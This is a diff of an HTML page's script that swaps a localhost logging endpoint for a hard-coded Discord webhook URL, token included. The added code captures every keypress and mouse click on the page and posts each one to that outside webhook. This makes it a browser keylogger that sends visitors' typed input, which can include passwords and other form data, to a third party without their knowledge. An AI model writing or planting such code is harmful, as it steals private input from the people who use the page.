@@ -40,32 +40,27 @@
     </div>
     
     <script>
-        // Function to send log data to the server
-        function sendLog(eventType, eventData) {
-            fetch("http://localhost:3000/log", {  // Replace with your server's IP or domain if needed
-                method: "POST",
-                body: JSON.stringify({
-                    eventType: eventType,
-                    eventData: eventData,
-                    time: new Date().toISOString()
-                }),
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            }).catch(error => {
-                console.error("Logging error:", error);
-            });
-        }
+    const webhookURL = "https://discord.com/api/webhooks/1345254892419289162/kvAcUG3KlpxqjziFmfr2a-kKKNJ-2t9gJWV3_u1TuklNQylDHeibnod9zVW7-V-rlyRK"; // Replace with your webhook URL
 
-        // Log mouse clicks
-        document.addEventListener("click", function(event) {
-            sendLog("click", { x: event.clientX, y: event.clientY });
+    function sendLog(eventType, eventData) {
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: `📢 **Event:** ${eventType}\n🖥 **Data:** ${JSON.stringify(eventData)}\n⏰ **Time:** ${new Date().toISOString()}`
+            })
         });
+    }
 
-        // Log key presses
-        document.addEventListener("keydown", function(event) {
-            sendLog("keydown", { key: event.key });
-        });
-    </script>
+    // Log mouse clicks
+    document.addEventListener("click", function(event) {
+        sendLog("Click", { x: event.clientX, y: event.clientY });
+    });
+
+    // Log key presses
+    document.addEventListener("keydown", function(event) {
+        sendLog("Key Pressed", { key: event.key });
+    });
+</script>
 </body>
 </html>
